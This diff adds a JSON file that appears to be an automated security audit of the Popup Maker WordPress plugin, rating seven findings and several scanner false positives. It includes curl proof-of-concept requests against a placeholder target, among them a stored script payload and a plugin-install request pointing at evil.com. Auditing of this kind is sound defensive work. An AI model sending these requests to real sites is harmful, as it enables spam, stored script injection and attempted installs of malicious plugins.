@@ -1,0 +1,158 @@
+{
+  "plugin": "popup-maker",
+  "analysis_date": "2026-06-15",
+  "analyst": "automated-security-review",
+  "verdicts": [
+    {
+      "id": "PM-001",
+      "title": "Unauthenticated Analytics Stat Manipulation via pum_analytics AJAX/REST",
+      "severity": "low",
+      "confirmed": true,
+      "exploitable": true,
+      "auth_required": false,
+      "vulnerability_class": "missing_auth",
+      "affected_handlers": [
+        "wp_ajax_nopriv_pum_analytics",
+        "wp_ajax_pum_analytics",
+        "REST: /pum/v1/analytics (GET/POST)"
+      ],
+      "affected_files": [
+        "classes/Analytics.php"
+      ],
+      "description": "The pum_analytics AJAX handler (lines 113-140 in Analytics.php) and the REST endpoint /pum/v1/analytics (registered at line 198 with permission_callback: '__return_true') both accept unauthenticated requests to track popup open/conversion events. There is no nonce verification (explicitly suppressed with a phpcs:ignore comment) and no rate limiting. An unauthenticated attacker can send arbitrary popup IDs and event types, causing the plugin to increment open or conversion counters on any existing popup.",
+      "proof_of_concept": "curl -s -X POST 'http://TARGET/wp-admin/admin-ajax.php' -d 'action=pum_analytics&event=open&pid=POPUP_ID&method=json'\ncurl -s 'http://TARGET/wp-json/pum/v1/analytics' -X POST -H 'Content-Type: application/json' --data-raw '{\"event\":\"open\",\"pid\":POPUP_ID}'",
+      "impact": "Inflates popup open/conversion analytics counters with no authentication. Purely a data integrity issue affecting analytics dashboards. No data is exposed, no code is executed. Admin cannot distinguish legitimate from fake events.",
+      "false_positive": false,
+      "notes": "The comment in the source ('Ignored because this form is shown on heavily cached pages to non-logged in users primarily') indicates this is a deliberate design decision. Event type is validated against a whitelist ['open','conversion'] and popup ID is validated as an existing popup post. The impact is limited to statistics corruption."
+    },
+    {
+      "id": "PM-002",
+      "title": "Unauthenticated Subscription Form Submission via pum_sub_form AJAX",
+      "severity": "low",
+      "confirmed": true,
+      "exploitable": true,
+      "auth_required": false,
+      "vulnerability_class": "missing_auth",
+      "affected_handlers": [
+        "wp_ajax_nopriv_pum_sub_form",
+        "wp_ajax_pum_sub_form"
+      ],
+      "affected_files": [
+        "classes/Newsletters.php"
+      ],
+      "description": "The pum_sub_form AJAX handler (Newsletters.php line 69) accepts subscription form submissions without any nonce verification. The comment explicitly suppresses nonce verification. An unauthenticated attacker can POST subscriber records (email, name, popup_id, provider) to the wp_pum_subscribers table. All input is sanitized (sanitize_email for email, sanitize_text_field for name fields) before storage, preventing XSS injection through these fields.",
+      "proof_of_concept": "curl -s -X POST 'http://TARGET/wp-admin/admin-ajax.php' -H 'Content-Type: application/x-www-form-urlencoded' --data-urlencode 'action=pum_sub_form' --data-urlencode 'values[email]=spam@attacker.com' --data-urlencode 'values[provider]=none' --data-urlencode 'values[popup_id]=POPUP_ID'",
+      "impact": "Allows unauthenticated spam submissions to the subscribers database. No XSS possible via email (sanitize_email strips HTML) or name fields (sanitize_text_field strips HTML). The consent_args[text] field is stored without sanitization when passed as JSON, but this field is not rendered in the admin subscriber table view, limiting exploitation.",
+      "false_positive": false,
+      "notes": "Intentional design - popup subscribe forms are meant to be accessible by anonymous visitors on cached pages. No rate limiting present. A high volume of requests could cause database bloat."
+    },
+    {
+      "id": "PM-003",
+      "title": "Unsanitized consent_args.text Stored in Subscriber Table",
+      "severity": "low",
+      "confirmed": true,
+      "exploitable": false,
+      "auth_required": false,
+      "vulnerability_class": "stored_xss",
+      "affected_handlers": [
+        "wp_ajax_nopriv_pum_sub_form"
+      ],
+      "affected_files": [
+        "classes/Newsletters.php",
+        "classes/DB/Subscribers.php"
+      ],
+      "description": "The pum_sub_form handler stores the consent_args field (submitted as JSON) without sanitizing the 'text' sub-field. Verified by submitting consent_args with text:'<script>alert(1)</script>' - the raw HTML is stored in the wp_pum_subscribers table (consent_args column as serialized PHP). However, the admin Subscribers/Table.php view does NOT render the consent_args column, and Privacy.php exports it via WordPress core privacy export API which handles its own escaping. Practical XSS exploitation path not confirmed.",
+      "proof_of_concept": "curl -s -X POST 'http://TARGET/wp-admin/admin-ajax.php' -H 'Content-Type: application/x-www-form-urlencoded' --data-urlencode 'action=pum_sub_form' --data-urlencode 'values[email]=test@test.com' --data-urlencode 'values[provider]=none' --data-urlencode 'values[popup_id]=POPUP_ID' --data-urlencode 'values[consent_args]={\"enabled\":\"yes\",\"required\":false,\"text\":\"<script>alert(1)</script>\"}'",
+      "impact": "HTML stored in consent_args.text column. Not currently rendered unescaped in any admin view examined. If a future admin feature renders this field without escaping, it would result in stored XSS.",
+      "false_positive": false,
+      "notes": "Latent vulnerability - no confirmed XSS execution path currently. The admin subscriber table does not display the consent_args field. Risk escalates if admin UI is extended to show this field without escaping."
+    },
+    {
+      "id": "PM-004",
+      "title": "REST /popup-maker/v1/upgrade/install - Multi-layer Auth Prevents Exploitation",
+      "severity": "informational",
+      "confirmed": false,
+      "exploitable": false,
+      "auth_required": false,
+      "vulnerability_class": "auth_bypass",
+      "affected_handlers": [
+        "REST: /popup-maker/v1/upgrade/install (POST)"
+      ],
+      "affected_files": [
+        "classes/Controllers/RestAPI.php",
+        "classes/Services/Connect.php"
+      ],
+      "description": "The /popup-maker/v1/upgrade/install REST endpoint uses permission_callback: '__return_true' but implements its own multi-layer authentication inside the callback via Services/Connect::verify_webhook_request(). Layers: (1) User-Agent must start with 'PopupMakerUpgrader', (2) X-Sending-Domain header must parse as wppopupmaker.com or upgrade.wppopupmaker.com, (3) Bearer token must hash_equals() match a site transient (only set when admin initiates connect flow), (4) HMAC-SHA256 signature required (kills connection if missing), (5) Active license required. Verified: all layers enforce correctly.",
+      "proof_of_concept": "TOKEN=$(from_transient); PAYLOAD='{\"file\":\"...\",\"nonce\":\"...\",\"slug\":\"...\",\"token\":\"...\"}'; SIG=$(echo -n \"$PAYLOAD\" | openssl dgst -sha256 -hmac \"$TOKEN\" -binary | base64); curl -s -X POST 'http://TARGET/wp-json/popup-maker/v1/upgrade/install' -H 'User-Agent: PopupMakerUpgrader/1.2.3' -H 'X-Sending-Domain: https://upgrade.wppopupmaker.com' -H \"Authorization: Bearer $TOKEN\" -H \"X-Popupmaker-Signature: $SIG\" -d \"$PAYLOAD\" => Returns license_inactive (blocked by license check)",
+      "impact": "Not exploitable without (1) a valid bearer token from the site's transient (set by admin action, 1-hour TTL) AND (2) active license AND (3) spoofed referrer/user-agent. An attacker who compromises the connect flow or intercepts the token during an admin-initiated connect could potentially install arbitrary plugins from any URL.",
+      "false_positive": true,
+      "notes": "The '__return_true' permission_callback is intentional - the endpoint implements its own webhook authentication. This is the intended design for server-to-server communication from upgrade.wppopupmaker.com."
+    },
+    {
+      "id": "PM-005",
+      "title": "REST /popup-maker/v2/connect/install - HMAC Signature Verification Optional",
+      "severity": "medium",
+      "confirmed": true,
+      "exploitable": false,
+      "auth_required": false,
+      "vulnerability_class": "auth_bypass",
+      "affected_handlers": [
+        "REST: /popup-maker/v2/connect/install (POST)"
+      ],
+      "affected_files": [
+        "classes/RestAPI/Connect.php"
+      ],
+      "description": "In the v2 endpoint's validate_secure_connection() method (RestAPI/Connect.php lines 207-223), the verify_signature() function (lines 319-370) silently returns without throwing an exception if neither X-CONTENTCONTROL-SIGNATURE nor X-POPUPMAKER-SIGNATURE headers are present (line 331: 'Signature is optional for some endpoints, but recommended'). This means the HMAC signature layer can be completely skipped by an attacker who simply omits the signature header. However, the other three layers remain: User-Agent must match /^PopupMakerUpgrader\\/\\d+\\.\\d+\\.\\d+$/, X-Sending-Domain must equal 'upgrade.wppopupmaker.com' exactly (production env check applies), Bearer token must match site transient, and license must be active.",
+      "proof_of_concept": "TOKEN=$(from_transient); curl -s -X POST 'http://TARGET/wp-json/popup-maker/v2/connect/install' -H 'Content-Type: application/json' -H 'User-Agent: PopupMakerUpgrader/1.2.3' -H 'X-Sending-Domain: upgrade.wppopupmaker.com' -H \"Authorization: Bearer $TOKEN\" -d '{\"file\":\"http://evil.com/plugin.zip\",\"slug\":\"evil-plugin\",\"type\":\"plugin\"}' => Returns license_inactive (without signature!)",
+      "impact": "An attacker who obtains the bearer token (e.g., via server log access, DB access, or observing the admin-initiated connect URL which includes the token as a GET parameter to upgrade.wppopupmaker.com) could skip the HMAC signature check and attempt to install an arbitrary plugin from any URL. Still blocked by license check. Threat model: if attacker has DB access, they can already do worse. If attacker can read the connect URL, they likely have admin access anyway.",
+      "false_positive": false,
+      "notes": "The signature weakness is a defense-in-depth failure. On sites with active Pro licenses where an admin recently started the connect flow, an attacker with token knowledge could trigger plugin installation. The token is also embedded in the connect URL which is sent to upgrade.wppopupmaker.com as a GET parameter - TLS prevents interception in normal conditions."
+    },
+    {
+      "id": "PM-006",
+      "title": "taint-flow False Positives: ListTable.php RCE/XSS Findings",
+      "severity": "informational",
+      "confirmed": false,
+      "exploitable": false,
+      "auth_required": true,
+      "vulnerability_class": "xss",
+      "affected_handlers": [],
+      "affected_files": [
+        "classes/ListTable.php"
+      ],
+      "description": "The automated taint flows popup-maker-xss-001 through popup-maker-xss-005 (absint values in printf) and popup-maker-rce-001/rce-002 (HTTP_HOST in preg_replace) and popup-maker-xss-006 (HTTP_HOST in echo) are all in PUM_ListTable, a copy of WP_List_Table used exclusively in admin-only pages. All access is restricted to authenticated admin users. The absint() calls (flows 002-005) are not XSS-capable as absint() returns an integer. Flow xss-001 uses (int) cast. The HTTP_HOST flows reach preg_replace (not preg_replace with /e flag or exec), so no RCE - the scanner incorrectly flagged preg_replace as a shell sink.",
+      "proof_of_concept": null,
+      "impact": "None - admin-only context and integer/URL escaping prevents exploitation.",
+      "false_positive": true,
+      "notes": "Automated scanner false positives: absint() output is safe for echo, preg_replace without /e modifier is not RCE, and ListTable is admin-only context."
+    },
+    {
+      "id": "PM-007",
+      "title": "taint-flow False Positive: SQL Injection in Abstract/Database.php",
+      "severity": "informational",
+      "confirmed": false,
+      "exploitable": false,
+      "auth_required": true,
+      "vulnerability_class": "sql_injection",
+      "affected_handlers": [],
+      "affected_files": [
+        "classes/Abstract/Database.php"
+      ],
+      "description": "The taint flow popup-maker-sqli-001 flagged $wpdb->update() at line 442 using a row ID from absint(). The $row_id parameter comes from absint() which produces a safe integer, and $wpdb->update() uses prepared statements internally. The semgrep finding at line 80 flags 'SHOW TABLES LIKE {$this->table_name()}' where table_name() returns a class property derived from plugin constants, not user input.",
+      "proof_of_concept": null,
+      "impact": "None - absint() prevents SQL injection and wpdb->update() uses parameterized queries.",
+      "false_positive": true,
+      "notes": "table_name() is not user-controllable. wpdb->update() is parameterized."
+    }
+  ],
+  "summary": {
+    "total_verdicts": 7,
+    "confirmed_vulnerabilities": 3,
+    "false_positives": 3,
+    "latent_risks": 1,
+    "highest_severity": "medium",
+    "priority_findings": ["PM-001", "PM-002", "PM-005"],
+    "unauthenticated_confirmed": ["PM-001", "PM-002", "PM-003"],
+    "key_findings": "Two nopriv AJAX handlers (pum_analytics, pum_sub_form) are confirmed unauthenticated entry points - pum_analytics allows stat manipulation, pum_sub_form allows spam subscription insertion. The REST /upgrade/install endpoint (v1) is properly protected with 5 security layers. The REST /connect/install (v2) has an optional HMAC signature vulnerability but requires a valid bearer token and active license to exploit. Most automated taint flow findings are false positives (admin-only context or safe data types). The ListTable.php RCE/XSS flows are completely false positives."
+  }
+}
